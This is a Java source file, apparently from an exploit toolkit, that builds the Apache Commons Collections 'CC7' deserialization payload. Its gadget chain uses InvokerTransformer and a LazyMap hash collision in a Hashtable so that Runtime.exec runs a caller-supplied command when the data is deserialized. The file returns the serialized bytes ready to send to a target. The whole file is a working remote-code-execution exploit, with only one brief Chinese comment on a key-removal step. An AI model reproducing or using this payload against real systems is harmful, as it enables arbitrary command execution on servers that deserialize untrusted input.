package top.racerz.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static byte[] getPayload(String command) throws Exception {
        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command})
        };

        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();

        Map map1 = LazyMap.decorate(hashMap1, fake);
        map1.put("1", 1);

        Map map2 = LazyMap.decorate(hashMap2, fake);
        map2.put("2", 2);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 2);

        Field field2 = ChainedTransformer.class.getDeclaredField("iTransformers");
        field2.setAccessible(true);
        field2.set(fake, transformers);

        //上面的 hashtable.put 会使得 map2 增加一个 1，所以这里要移除
        map2.remove("1");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);
        byteArrayOutputStream.flush();
        byteArrayOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }
}
